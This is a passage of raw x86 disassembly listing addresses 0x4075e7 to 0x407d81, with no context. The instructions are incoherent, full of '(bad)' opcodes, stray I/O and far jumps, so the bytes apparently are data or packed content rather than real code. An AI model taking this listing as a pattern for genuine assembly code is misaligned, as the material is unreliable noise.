  4075e7:	popf   
  4075e8:	xchg   edi,eax
  4075e9:	sub    BYTE PTR [eax-0x59],al
  4075ec:	test   BYTE PTR [ebp-0x29c12a62],bh
  4075f2:	push   esi
  4075f3:	xor    cl,BYTE PTR [ecx-0x36]
  4075f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075f7:	outs   dx,BYTE PTR ds:[esi]
  4075f8:	iret   
  4075f9:	or     esi,DWORD PTR [edx]
  4075fb:	leave  
  4075fc:	test   DWORD PTR [esi+0x2030c63],edx
  407602:	xchg   ebp,eax
  407603:	mov    ebx,0x8cfdbfd8
  407608:	jecxz  0x40764a
  40760a:	adc    esi,DWORD PTR [ebx-0x7b]
  40760d:	push   esp
  40760e:	punpcklwd mm7,mm1
  407611:	mov    BYTE PTR [esi],bl
  407613:	adc    DWORD PTR [edi+esi*4-0x71],edx
  407617:	hlt    
  407618:	fist   DWORD PTR [esp+ebx*4]
  40761b:	ja     0x4075e2
  40761d:	or     dl,cl
  40761f:	je     0x4075f1
  407621:	xchg   ebx,eax
  407622:	rcr    BYTE PTR [ebp-0xed0fee],0x43
  407629:	cmp    dl,BYTE PTR [ebx-0x7]
  40762c:	mov    ch,0xab
  40762e:	rcl    BYTE PTR [edi-0x5b5d8ab8],cl
  407634:	pusha  
  407635:	jne    0x407673
  407637:	mov    DWORD PTR [edi-0x29],ecx
  40763a:	xchg   ebp,eax
  40763b:	ror    DWORD PTR [eax+0x4348b25b],0x14
  407642:	fxch   st(4)
  407644:	lock mov fs,ecx
  407647:	xor    esi,DWORD PTR [edi+ebp*4]
  40764a:	pop    eax
  40764b:	inc    DWORD PTR [ebx+0x46]
  40764e:	in     eax,dx
  40764f:	push   0x723989d6
  407654:	pop    ds
  407655:	and    eax,DWORD PTR [edx-0x68]
  407658:	push   eax
  407659:	fstp   DWORD PTR [ebx-0x22]
  40765c:	clc    
  40765d:	in     al,0x5b
  40765f:	mov    al,0xdb
  407661:	addr16 push ebp
  407663:	jne    0x4076e2
  407665:	in     al,0x7c
  407667:	sub    BYTE PTR ds:0x4d33b568,bl
  40766d:	out    dx,eax
  40766e:	cmp    DWORD PTR [ebx+ebx*4],ebx
  407671:	pop    ebp
  407672:	dec    ecx
  407673:	popa   
  407674:	mov    bl,0x0
  407676:	fwait
  407677:	jo     0x4076cb
  407679:	jnp    0x407615
  40767b:	inc    esp
  40767c:	pusha  
  40767d:	outs   dx,BYTE PTR ds:[esi]
  40767e:	retf   
  40767f:	pop    esp
  407680:	mov    esp,0xce921123
  407685:	push   esi
  407686:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407687:	aaa    
  407688:	push   ebp
  407689:	dec    esp
  40768a:	or     bh,dh
  40768c:	hlt    
  40768d:	jb     0x407645
  40768f:	aaa    
  407690:	xchg   esi,eax
  407691:	lods   eax,DWORD PTR ds:[esi]
  407692:	lahf   
  407693:	mov    ecx,0xede5683b
  407698:	xchg   esp,eax
  407699:	and    bh,ch
  40769b:	and    eax,0xef40d409
  4076a0:	dec    edx
  4076a1:	sub    BYTE PTR [esi],0x46
  4076a4:	sub    al,al
  4076a6:	retf   
  4076a7:	in     al,dx
  4076a8:	gs mov dl,0x64
  4076ab:	dec    edi
  4076ac:	es xchg ebp,eax
  4076ae:	inc    edx
  4076af:	int3   
  4076b0:	mov    bh,0xa4
  4076b2:	mov    bl,0xdf
  4076b4:	mov    ds:0x38010b9d,eax
  4076b9:	cmp    eax,0x32d14e0f
  4076be:	test   al,0x87
  4076c0:	out    0xf1,al
  4076c2:	add    al,0xf3
  4076c4:	cmp    al,BYTE PTR [eax+0xf2f603e]
  4076ca:	cdq    
  4076cb:	mov    DWORD PTR [esi+0x16],ecx
  4076ce:	jmp    0x56d31141
  4076d3:	inc    ebx
  4076d4:	inc    edi
  4076d5:	jmp    0x2833:0x23928f7c
  4076dc:	ss je  0x4076b0
  4076df:	lahf   
  4076e0:	loop   0x40766c
  4076e2:	jb     0x4076ac
  4076e4:	mov    edx,0xe89334cc
  4076e9:	popa   
  4076ea:	xchg   edx,eax
  4076eb:	enter  0x3958,0x1d
  4076ef:	inc    BYTE PTR [ecx]
  4076f1:	cwde   
  4076f2:	push   esp
  4076f3:	adc    ecx,esi
  4076f5:	adc    al,dh
  4076f7:	sti    
  4076f8:	inc    edi
  4076f9:	add    al,0x3f
  4076fb:	dec    ebx
  4076fc:	push   ss
  4076fd:	inc    ebp
  4076fe:	cmp    eax,0x67e15fa0
  407703:	test   eax,0x92d6b7ae
  407708:	sub    eax,0xcad75333
  40770d:	push   eax
  40770e:	mov    WORD PTR [edi],cs
  407710:	adc    bh,BYTE PTR [ebp+0x333482f]
  407716:	and    BYTE PTR [ebp+0x18],bl
  407719:	nop
  40771a:	add    eax,DWORD PTR [ebx+0x66557f81]
  407720:	ror    BYTE PTR [ebx+0x3de6c524],cl
  407726:	and    eax,0x798ba052
  40772b:	dec    esp
  40772c:	inc    esi
  40772d:	adc    cl,bh
  40772f:	pop    eax
  407730:	cmp    ebx,DWORD PTR [edx+0x120bcd10]
  407736:	dec    ecx
  407737:	es pop ebx
  407739:	cmp    eax,0xe9ff9d6d
  40773e:	bound  esp,QWORD PTR [ebx-0x20]
  407741:	(bad)  
  407742:	ins    BYTE PTR es:[edi],dx
  407743:	jno    0x4077a7
  407745:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407746:	jmp    0x86c51fac
  40774b:	xchg   esi,eax
  40774c:	or     BYTE PTR [bp+si-0x47],cl
  407750:	aam    0xa2
  407752:	scas   al,BYTE PTR es:[edi]
  407753:	sub    DWORD PTR [ebx+0x50],ebp
  407756:	xchg   edi,eax
  407757:	pop    ecx
  407758:	mov    ah,0xa5
  40775a:	sbb    DWORD PTR [edx+0x52],esp
  40775d:	mov    WORD PTR [edi-0x28f24732],ds
  407763:	inc    edi
  407764:	mov    al,0x6
  407766:	pusha  
  407767:	push   cs
  407768:	aam    0xdd
  40776a:	ficom  WORD PTR [ebp-0x65]
  40776d:	les    ebp,FWORD PTR [edi+0x360bbe42]
  407773:	stos   DWORD PTR es:[edi],eax
  407774:	ret    
  407775:	and    BYTE PTR [ecx+ecx*4-0x4a],al
  407779:	dec    ecx
  40777a:	xlat   BYTE PTR ds:[ebx]
  40777b:	sar    ecx,1
  40777d:	push   ss
  40777e:	cmp    DWORD PTR [eax-0xf025769],ebp
  407784:	pop    edx
  407785:	dec    edi
  407786:	xchg   ebx,eax
  407787:	sub    al,0x7c
  407789:	add    dl,0x33
  40778c:	sar    BYTE PTR [esi+0x4fd89b96],0x35
  407793:	add    al,0xc2
  407795:	mov    bl,0xbf
  407797:	sbb    ecx,edx
  407799:	jne    0x40774a
  40779b:	mov    eax,0x32906de4
  4077a0:	pop    esp
  4077a1:	cmp    eax,0x6d62e030
  4077a6:	arpl   WORD PTR [ecx+0xde0535d],bx
  4077ac:	repnz frstor [eax+0x74]
  4077b0:	xor    bl,BYTE PTR [ebx]
  4077b2:	pop    ds
  4077b3:	popf   
  4077b4:	push   ds
  4077b5:	repnz push ebx
  4077b7:	popf   
  4077b8:	sub    edx,DWORD PTR [ecx+ebx*8-0x3d]
  4077bc:	and    al,BYTE PTR fs:[ebx-0x76]
  4077c0:	or     ebp,ecx
  4077c2:	jne    0xebefd304
  4077c8:	pop    esi
  4077c9:	mov    edi,0x7b053f10
  4077ce:	inc    ecx
  4077cf:	mov    bl,0x12
  4077d1:	xor    DWORD PTR [ebp+0x51bf262b],edi
  4077d7:	inc    ecx
  4077d8:	sub    ebx,DWORD PTR [edx-0x683882b2]
  4077de:	mov    esp,0xdfa30fd6
  4077e3:	jbe    0x407821
  4077e5:	iret   
  4077e6:	shl    ebx,cl
  4077e8:	sbb    esi,DWORD PTR [ecx+edi*4]
  4077eb:	jae    0x407838
  4077ed:	sar    cl,cl
  4077ef:	aad    0x87
  4077f1:	jnp    0x40783f
  4077f3:	in     eax,0x55
  4077f5:	pop    edi
  4077f6:	ja     0x407850
  4077f8:	pop    edx
  4077f9:	imul   esp,DWORD PTR [ecx-0x72a6a5a],0xffffffd0
  407800:	out    dx,al
  407801:	inc    edi
  407802:	dec    esi
  407803:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407805:	dec    esi
  407806:	stos   DWORD PTR es:[edi],eax
  407807:	inc    ecx
  407808:	sti    
  407809:	stos   DWORD PTR es:[edi],eax
  40780a:	sub    dl,BYTE PTR [eax]
  40780c:	mov    ecx,0x4897e4b0
  407811:	repnz xor dl,BYTE PTR [ecx+0x776822c5]
  407818:	int3   
  407819:	out    dx,eax
  40781a:	call   0x8e0d:0x3e68275f
  407821:	(bad)  
  407822:	mov    bl,0x5b
  407824:	jl     0x4077c3
  407826:	out    dx,eax
  407827:	fild   DWORD PTR [esi]
  407829:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40782a:	jbe    0x407858
  40782c:	rcr    DWORD PTR [edx+0x3b64b36e],0xb6
  407833:	sub    bh,al
  407835:	mov    cl,0xd9
  407837:	and    eax,0x7ef21ef5
  40783c:	push   es
  40783d:	push   es
  40783e:	inc    edx
  40783f:	xchg   DWORD PTR [eax],esp
  407841:	popf   
  407842:	fidivr WORD PTR [ebx+ecx*1+0x1d]
  407846:	pop    ss
  407847:	sti    
  407848:	fbstp  TBYTE PTR [edi+0x6a]
  40784b:	sbb    eax,0xbc6d23e1
  407850:	idiv   BYTE PTR [esi]
  407852:	or     ah,ah
  407854:	dec    edx
  407855:	push   edx
  407856:	lods   al,BYTE PTR ds:[esi]
  407857:	mov    al,ds:0x11884e3a
  40785c:	stos   DWORD PTR es:[edi],eax
  40785d:	fadd   DWORD PTR ds:0x101ff084
  407863:	dec    ecx
  407864:	test   eax,0x569d76db
  407869:	(bad)  
  40786a:	mov    al,ds:0xd12bfa1b
  40786f:	mov    eax,DWORD PTR [ecx-0x4c]
  407872:	dec    esp
  407873:	out    0xdf,eax
  407875:	mov    ecx,0xefe8233b
  40787a:	gs push ss
  40787c:	pop    ecx
  40787d:	mov    ah,0xc4
  40787f:	aaa    
  407880:	cli    
  407881:	(bad)  
  407883:	hlt    
  407884:	pop    edi
  407885:	addr16 repz (bad) 
  407889:	rcl    BYTE PTR ds:0xcc43d921,cl
  40788f:	fldenv [edx]
  407891:	adc    ebp,esp
  407893:	out    0x1e,al
  407895:	add    eax,0x60604ea1
  40789a:	retf   0x2ead
  40789d:	in     eax,dx
  40789e:	ins    DWORD PTR es:[edi],dx
  40789f:	iret   
  4078a0:	repz mov bh,ah
  4078a3:	bound  ecx,QWORD PTR [eax+0x112ca78c]
  4078a9:	inc    esp
  4078aa:	or     dh,BYTE PTR [esi]
  4078ac:	test   DWORD PTR [edx-0x4e],esp
  4078af:	mov    al,0xc7
  4078b1:	jecxz  0x407862
  4078b3:	xchg   BYTE PTR [ebx],ch
  4078b5:	lds    ecx,FWORD PTR ds:0x36cf929e
  4078bb:	mov    edx,0x17a96230
  4078c0:	push   edx
  4078c1:	jo     0x407861
  4078c3:	dec    edx
  4078c4:	repnz adc al,0x5d
  4078c7:	mov    ch,0xf7
  4078c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078ca:	xchg   esp,eax
  4078cb:	dec    ebp
  4078cc:	scas   eax,DWORD PTR es:[edi]
  4078cd:	(bad)  
  4078ce:	mov    ds,WORD PTR [edi-0x17]
  4078d1:	mov    DWORD PTR [edi],edi
  4078d3:	sahf   
  4078d4:	push   eax
  4078d5:	cmp    esp,DWORD PTR [ebx]
  4078d7:	ja     0x407925
  4078d9:	jb     0x4078af
  4078db:	inc    edx
  4078dc:	jo     0x4078fe
  4078de:	call   0x8b45:0x51c35977
  4078e5:	add    al,BYTE PTR [ebx+ecx*8]
  4078e8:	xlat   BYTE PTR ds:[ebx]
  4078e9:	inc    esi
  4078ea:	and    esp,DWORD PTR [edx-0x22318f7d]
  4078f0:	jns    0x40795a
  4078f2:	jmp    0x40796d
  4078f4:	or     DWORD PTR [ebx-0x16ef432],esi
  4078fa:	nop
  4078fb:	int    0x5a
  4078fd:	dec    ebx
  4078fe:	imul   eax,ebp,0xffffffe3
  407901:	inc    esp
  407902:	mov    BYTE PTR [ecx],0x7e
  407905:	adc    DWORD PTR ds:0x2b6c99c4,esp
  40790b:	lds    edi,FWORD PTR [eax]
  40790d:	mov    eax,0xa410253d
  407912:	mov    dh,0xaf
  407914:	xor    dh,BYTE PTR [esi+0x493b705d]
  40791a:	jo     0x40795f
  40791c:	out    0x81,al
  40791e:	mov    bl,BYTE PTR [ecx+0x73]
  407921:	pop    ss
  407922:	xchg   ebx,eax
  407923:	bnd jb 0x4078f0
  407926:	push   0xa4c1c040
  40792b:	or     al,0x36
  40792d:	out    0x4e,eax
  40792f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407930:	imul   ebp,DWORD PTR [eax+0x7605c2b1],0x616fa300
  40793a:	push   ss
  40793b:	jp     0x4078d1
  40793d:	ins    DWORD PTR es:[edi],dx
  40793e:	lods   eax,DWORD PTR ds:[esi]
  40793f:	leave  
  407940:	int    0x20
  407942:	pop    edx
  407943:	pop    es
  407944:	cld    
  407945:	mov    eax,ds:0x718c15bc
  40794a:	std    
  40794b:	pop    edx
  40794c:	fnsave ds:[ecx+0x2c]
  407950:	pop    ebx
  407951:	mov    cl,0xea
  407953:	fstp   QWORD PTR [ebp+edx*4-0x1b754e7]
  40795a:	imul   esp,edx,0x3b
  40795d:	adc    BYTE PTR [eax+0x18],ch
  407960:	mov    edi,0x726495d4
  407965:	jl     0x407908
  407967:	pop    ss
  407968:	sbb    ebx,DWORD PTR [edx]
  40796a:	inc    esp
  40796b:	mov    ebx,0x39a6e24f
  407970:	dec    ebp
  407971:	jp     0x40799a
  407973:	sub    BYTE PTR cs:[esi+0x57],ah
  407977:	xor    al,0x23
  407979:	sahf   
  40797a:	xlat   BYTE PTR ds:[ebx]
  40797b:	or     DWORD PTR [esi],ecx
  40797d:	rol    ch,0x70
  407980:	into   
  407981:	jge    0x4079b1
  407983:	shl    BYTE PTR [ebp+0x61],0x46
  407987:	scas   eax,DWORD PTR es:[edi]
  407988:	mov    eax,0x4bb220ad
  40798d:	into   
  40798e:	add    al,0xf5
  407990:	ja     0x407958
  407992:	xchg   ebp,eax
  407993:	popa   
  407994:	and    esi,DWORD PTR [eax+0xfe0b6d1]
  40799a:	mov    al,BYTE PTR [edx+eax*2+0x35a474cc]
  4079a1:	fdiv   QWORD PTR ds:0xdd8a8422
  4079a7:	(bad)  [edi]
  4079a9:	jns    0x4079e0
  4079ab:	or     ebp,DWORD PTR [esi+eiz*1]
  4079ae:	lea    esp,[ebp-0x79]
  4079b1:	arpl   cx,sp
  4079b3:	std    
  4079b4:	mov    edx,0x8d8916e6
  4079b9:	add    edx,DWORD PTR [edx+0xfab98f9]
  4079bf:	xchg   edx,eax
  4079c0:	lods   eax,DWORD PTR ds:[esi]
  4079c1:	xor    eax,0xe37bf458
  4079c6:	lods   eax,DWORD PTR ds:[esi]
  4079c7:	cmp    DWORD PTR [ebp+0x6a],ebp
  4079ca:	fisttp DWORD PTR [ebx-0x4763ff3e]
  4079d0:	stos   DWORD PTR es:[edi],eax
  4079d1:	call   0xf74d291b
  4079d6:	mov    esp,0xf8a60de2
  4079db:	cld    
  4079dc:	popa   
  4079dd:	dec    esp
  4079df:	dec    edx
  4079e0:	mov    ds:0x99563b0b,eax
  4079e5:	add    BYTE PTR [esi+0x5c],dh
  4079e8:	mov    dh,dl
  4079ea:	pop    ebx
  4079eb:	mov    bh,0x2e
  4079ed:	cmp    bl,BYTE PTR [eax]
  4079ef:	or     al,0x6a
  4079f2:	and    BYTE PTR [ebp+0x36],ah
  4079f5:	cwde   
  4079f6:	sar    BYTE PTR [ebx-0x43],0x5e
  4079fa:	xchg   edx,eax
  4079fb:	dec    eax
  4079fc:	imul   ebx,DWORD PTR [eax],0x55
  4079ff:	rcl    DWORD PTR [eax+ecx*2],1
  407a02:	pop    eax
  407a03:	or     al,0xdb
  407a05:	jmp    0x2854a244
  407a0a:	jae    0x4079b2
  407a0c:	leave  
  407a0d:	lock mov dh,0x8e
  407a10:	mov    bl,0x21
  407a12:	sbb    BYTE PTR [edi+0x60],al
  407a15:	add    DWORD PTR [ecx+eax*8+0x13],esp
  407a19:	jmp    0x17fd19c9
  407a1e:	mov    edi,0x263ca67e
  407a23:	nop
  407a24:	lods   al,BYTE PTR ds:[esi]
  407a25:	jb     0x4079bb
  407a27:	stc    
  407a28:	sub    eax,0xd4af6d8
  407a2d:	(bad)  
  407a2e:	sahf   
  407a2f:	lahf   
  407a30:	int    0x83
  407a32:	lds    edx,FWORD PTR [eax+0x22]
  407a35:	xlat   BYTE PTR ds:[ebx]
  407a36:	jnp    0x407a81
  407a38:	scas   al,BYTE PTR es:[edi]
  407a39:	jns    0x407a37
  407a3b:	xor    al,0x57
  407a3d:	cs sahf 
  407a3f:	psubsw mm4,QWORD PTR [ecx-0x1b]
  407a43:	dec    esp
  407a44:	and    eax,0x6b64cf28
  407a49:	cmp    al,0xc1
  407a4b:	push   ss
  407a4c:	imul   ecx,DWORD PTR ds:0x544569db,0xfc842274
  407a56:	push   ss
  407a57:	je     0x4079e8
  407a59:	ins    BYTE PTR es:[edi],dx
  407a5a:	pop    ecx
  407a5b:	(bad)  [esi]
  407a5d:	adc    BYTE PTR ds:0xbcbc4fa,ch
  407a63:	fcmovb st,st(1)
  407a65:	cmp    al,0x42
  407a67:	xchg   ecx,eax
  407a68:	inc    esi
  407a69:	pop    edi
  407a6a:	lea    edi,[edx+0x1e2200f3]
  407a70:	repz int 0x88
  407a73:	jbe    0x407a5b
  407a75:	pop    esi
  407a76:	enter  0xdf35,0xda
  407a7a:	fs rcr dl,cl
  407a7d:	cld    
  407a7e:	jae    0x407aa5
  407a80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a81:	mov    ah,0xe8
  407a83:	outs   dx,BYTE PTR ds:[esi]
  407a84:	jge    0x407ada
  407a86:	dec    esi
  407a87:	out    0x99,al
  407a89:	sahf   
  407a8a:	leave  
  407a8b:	or     DWORD PTR [ecx+0x52],esi
  407a8e:	add    al,bl
  407a90:	xor    eax,0xb35c8ce5
  407a95:	mov    bl,0x40
  407a97:	leave  
  407a98:	retf   
  407a99:	sbb    eax,0x66a374
  407a9e:	xchg   esi,eax
  407a9f:	in     eax,dx
  407aa0:	shr    dl,cl
  407aa2:	sub    DWORD PTR [ecx+ebx*8-0x20],esp
  407aa6:	or     al,0xfe
  407aa8:	into   
  407aa9:	clc    
  407aaa:	adc    DWORD PTR [ebp-0x49],ebx
  407aad:	cmp    al,0x92
  407aaf:	out    dx,eax
  407ab0:	jnp    0x407b06
  407ab2:	lods   eax,DWORD PTR ds:[esi]
  407ab3:	stc    
  407ab4:	or     BYTE PTR [edi+0x5f],ch
  407ab7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ab8:	jne    0x407b00
  407aba:	pop    ebp
  407abb:	dec    ebx
  407abc:	fbld   TBYTE PTR [eax-0x5b4a1bd7]
  407ac2:	sub    DWORD PTR [esi-0x454e1d77],ecx
  407ac8:	or     DWORD PTR [ebx+0xa],0x780446b5
  407acf:	push   ebx
  407ad0:	pop    edi
  407ad1:	jg     0x407b3c
  407ad3:	mov    ds:0x6c830018,eax
  407ad8:	mov    esp,0xabf34883
  407add:	fs pushf 
  407adf:	xor    eax,0x9e5c7ec1
  407ae4:	dec    ebp
  407ae5:	push   ebp
  407ae6:	xchg   DWORD PTR cs:[ecx+0x3],esi
  407aea:	sbb    ah,BYTE PTR [edx]
  407aec:	fnstcw WORD PTR [esi-0x46c2c6dc]
  407af2:	sub    eax,0x7cd933d0
  407af7:	cmp    eax,DWORD PTR [ebx+0x1374a344]
  407afd:	sbb    ah,BYTE PTR [esi+edx*8+0xa]
  407b01:	sahf   
  407b02:	sub    DWORD PTR [esi+0x7dbc129a],0x9f795c6b
  407b0c:	adc    bl,BYTE PTR [ecx-0x1980cd6d]
  407b12:	add    esp,ebp
  407b14:	dec    ebx
  407b15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b16:	iret   
  407b17:	pushf  
  407b18:	hlt    
  407b19:	mov    ds:0xe16d6c21,al
  407b1e:	call   0xf30631aa
  407b23:	ret    
  407b24:	jno    0x407ba4
  407b26:	xchg   edx,eax
  407b27:	or     al,0x81
  407b29:	adc    DWORD PTR [eax+0x62],0xe3b47ddb
  407b30:	imul   eax,DWORD PTR [edx+0x60],0xc064ad34
  407b37:	out    dx,al
  407b38:	sub    DWORD PTR [ebp+edx*8-0x3eaa4924],eax
  407b3f:	mov    ebp,0x5181a64f
  407b44:	loope  0x407ac9
  407b46:	hlt    
  407b47:	fwait
  407b48:	and    dh,BYTE PTR ds:0x51561201
  407b4e:	inc    ebx
  407b4f:	sbb    edx,ebx
  407b51:	xchg   edi,eax
  407b52:	fwait
  407b53:	sar    BYTE PTR [ebp-0x185e2a59],0xd5
  407b5a:	out    dx,eax
  407b5b:	dec    esi
  407b5c:	retf   0xfae5
  407b5f:	std    
  407b60:	push   ebp
  407b61:	dec    edi
  407b62:	or     DWORD PTR [ebx+edi*8+0x3981cd6d],0xffffffb8
  407b6a:	std    
  407b6b:	push   ebx
  407b6c:	jnp    0x407b98
  407b6e:	loop   0x407b66
  407b70:	(bad)  
  407b71:	jbe    0x407b8c
  407b73:	enter  0x8c3e,0x43
  407b77:	addr16 adc eax,0x527bceb9
  407b7d:	outs   dx,DWORD PTR ds:[esi]
  407b7e:	ds aas 
  407b80:	sahf   
  407b81:	dec    ebx
  407b82:	nop
  407b83:	adc    ebp,ecx
  407b85:	icebp  
  407b86:	sbb    DWORD PTR [ecx],ebx
  407b88:	add    dh,cl
  407b8a:	add    al,BYTE PTR [esi-0xd7007e1]
  407b90:	jbe    0x407bed
  407b92:	pop    edi
  407b93:	push   0xffffff83
  407b95:	fwait
  407b96:	loopne 0x407b92
  407b98:	addr16 inc esi
  407b9a:	and    BYTE PTR ds:0x1121dba5,0x90
  407ba1:	ss jmp 0x282:0xb2da6341
  407ba9:	out    dx,al
  407baa:	jne    0x407b90
  407bac:	pop    ecx
  407bad:	jnp    0x407b82
  407baf:	sub    bh,dh
  407bb1:	jb     0x407b85
  407bb3:	cwde   
  407bb4:	add    BYTE PTR [esi-0x4],0xdf
  407bb8:	pusha  
  407bb9:	sub    BYTE PTR [esi-0x7f],ch
  407bbc:	fwait
  407bbd:	pusha  
  407bbe:	dec    ebp
  407bbf:	in     eax,0x8f
  407bc1:	imul   esp,ecx,0xb21b29e8
  407bc7:	pusha  
  407bc8:	xchg   DWORD PTR [ebp-0x43a97d24],esp
  407bce:	mov    bl,bl
  407bd0:	push   cs
  407bd1:	push   esi
  407bd2:	push   ecx
  407bd3:	inc    ebp
  407bd4:	push   ds
  407bd5:	jg     0x407bc8
  407bd7:	cli    
  407bd8:	cmp    DWORD PTR [eax],eax
  407bda:	mov    edi,0x83ae79c2
  407bdf:	cmp    eax,0x2adb1319
  407be4:	test   ecx,ebp
  407be6:	bound  ebx,QWORD PTR [esp+eax*1]
  407be9:	test   BYTE PTR ds:0x4c0dbcd0,bh
  407bef:	cli    
  407bf0:	cwde   
  407bf1:	pop    DWORD PTR [ebx+0x71]
  407bf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bf5:	dec    ebx
  407bf6:	lods   eax,DWORD PTR ds:[esi]
  407bf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bf8:	xor    eax,0x14dffff7
  407bfd:	ret    
  407bfe:	outs   dx,DWORD PTR ds:[esi]
  407bff:	(bad)  
  407c00:	das    
  407c01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c02:	cmp    DWORD PTR [ebx+0x6be60ff2],edi
  407c08:	popf   
  407c09:	xor    DWORD PTR [esi-0x785f50ff],ebp
  407c0f:	leave  
  407c10:	dec    ecx
  407c11:	ins    BYTE PTR es:[edi],dx
  407c12:	rcr    DWORD PTR [ebx+0x7],0xc0
  407c16:	xor    dh,bh
  407c18:	inc    ecx
  407c19:	adc    ebp,ebp
  407c1b:	data16 (bad) 
  407c1d:	adc    DWORD PTR [eax+0x22457d80],edi
  407c23:	sub    al,0x8a
  407c25:	push   esp
  407c26:	add    BYTE PTR [eax],0x51
  407c29:	test   DWORD PTR [eax+0x60],ecx
  407c2c:	fcmovu st,st(5)
  407c2e:	inc    esi
  407c2f:	out    0x3c,al
  407c31:	push   0xfe0780d2
  407c36:	ror    DWORD PTR [ecx+0x366758f6],cl
  407c3c:	imul   esi,DWORD PTR [edx+0x814a4a6],0x7429a6f9
  407c46:	and    eax,0xfb02ba10
  407c4b:	loope  0x407c6e
  407c4d:	test   cl,0xb3
  407c50:	inc    edi
  407c51:	jmp    0x407be3
  407c53:	pop    gs
  407c55:	cmc    
  407c56:	pop    ss
  407c57:	daa    
  407c58:	xchg   DWORD PTR [eax],ebx
  407c5a:	out    0x32,eax
  407c5c:	int3   
  407c5d:	push   ebx
  407c5e:	mov    al,BYTE PTR [ebp-0x2a9ea0e2]
  407c64:	mov    ah,0xe5
  407c66:	pop    esi
  407c67:	std    
  407c68:	push   ebp
  407c69:	imul   eax,DWORD PTR [edx+0x7f],0xce60de81
  407c70:	imul   ecx,DWORD PTR [edx],0xfffffff0
  407c73:	mov    gs,ecx
  407c75:	dec    esi
  407c76:	cmp    esi,eax
  407c78:	fcom   DWORD PTR [esi-0x33bf21af]
  407c7e:	jge    0x407c36
  407c80:	sub    DWORD PTR [eax+0x5691e435],ebp
  407c86:	aad    0x62
  407c88:	cmc    
  407c89:	loopne 0x407c4d
  407c8b:	adc    esp,ebx
  407c8d:	push   ebx
  407c8e:	imul   esp,DWORD PTR [edx+0x3],0x645b9765
  407c95:	xchg   esp,eax
  407c96:	push   es
  407c97:	sub    DWORD PTR [ebx-0x3e],0xcffef2bd
  407c9e:	loopne 0x407ca8
  407ca0:	clc    
  407ca1:	jmp    0xc66b:0x930db859
  407ca8:	and    bh,BYTE PTR [edx+ebp*4+0xd33b349]
  407caf:	aas    
  407cb0:	test   DWORD PTR [eax+eax*1-0x1a],edx
  407cb4:	fldenv [ebp+0x5857dc3a]
  407cba:	arpl   WORD PTR [eax-0x2f1f4d47],di
  407cc0:	adc    al,0x35
  407cc2:	or     eax,0x10fb8fac
  407cc7:	xchg   edx,eax
  407cc8:	ror    BYTE PTR [ebx-0x1c],0x65
  407ccc:	inc    si
  407cce:	ret    0xc54a
  407cd1:	inc    edx
  407cd2:	pop    ss
  407cd3:	shr    cl,cl
  407cd5:	jne    0x407ca9
  407cd7:	je     0x407c6f
  407cd9:	cld    
  407cda:	fiadd  WORD PTR [ebx]
  407cdc:	xor    al,0x6
  407cde:	mov    cs,WORD PTR ds:0x6afaf21b
  407ce4:	or     al,0x57
  407ce6:	jge    0x407cbe
  407ce8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ce9:	sub    edi,0xffffffab
  407cec:	jl     0x407c7e
  407cee:	dec    esi
  407cef:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  407cf1:	push   ds
  407cf2:	test   al,0xc7
  407cf4:	jb     0x407cab
  407cf6:	cmp    al,0x74
  407cf8:	cmp    al,BYTE PTR [esi]
  407cfa:	mov    ecx,0xe6747ee4
  407cff:	xchg   BYTE PTR [eax+0x39406789],dl
  407d05:	arpl   WORD PTR [edx-0x7c],di
  407d08:	nop
  407d09:	nop
  407d0a:	and    eax,DWORD PTR [ebx-0x8c31699]
  407d10:	mov    al,ds:0x89b832a0
  407d15:	iret   
  407d16:	mov    ch,BYTE PTR [eax+0x7f]
  407d19:	outs   dx,DWORD PTR ds:[esi]
  407d1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d1b:	mov    ecx,0x342f124d
  407d20:	push   ebp
  407d21:	mov    esi,DWORD PTR [ebp+0x55]
  407d24:	cmp    BYTE PTR [esi+0x6c],0x1
  407d28:	pop    edx
  407d29:	jnp    0x407d56
  407d2b:	cli    
  407d2c:	and    dl,BYTE PTR [edx]
  407d2e:	fcmovu st,st(4)
  407d30:	add    ecx,ebp
  407d32:	pop    ebx
  407d33:	in     al,dx
  407d34:	retf   
  407d35:	inc    esi
  407d36:	mov    dh,0xe3
  407d38:	or     al,0x61
  407d3a:	dec    edi
  407d3b:	sub    ch,BYTE PTR [eax]
  407d3d:	mov    edx,esp
  407d3f:	mov    ds:0x401d7b09,eax
  407d44:	push   esi
  407d45:	pop    eax
  407d46:	jno    0x407cf2
  407d48:	sub    ebp,DWORD PTR [esp+edi*4-0x80]
  407d4c:	sub    esp,DWORD PTR [esi+0x28]
  407d4f:	ds scas al,BYTE PTR es:[edi]
  407d51:	hlt    
  407d52:	cmp    DWORD PTR [esi],ebx
  407d54:	mov    dl,0x64
  407d56:	int    0xaf
  407d58:	pop    edx
  407d59:	stc    
  407d5a:	xchg   edx,eax
  407d5b:	add    al,BYTE PTR [eax]
  407d5d:	xchg   eax,esi
  407d5f:	jnp    0x407d2a
  407d61:	or     al,0xfd
  407d63:	clc    
  407d64:	mov    dl,bl
  407d66:	scas   al,BYTE PTR es:[edi]
  407d67:	push   0xffffffb6
  407d69:	jb     0x407d25
  407d6b:	mov    WORD PTR [ebx],?
  407d6d:	sbb    DWORD PTR [ebx-0x50],ecx
  407d70:	pop    edx
  407d71:	les    ebp,FWORD PTR [edx+0x24603f5b]
  407d77:	test   DWORD PTR [esi+0x13e030b],esp
  407d7d:	outs   dx,BYTE PTR ds:[esi]
  407d7e:	and    DWORD PTR [esi-0x74],esi
  407d81:	add    eax,0x8c4898f8
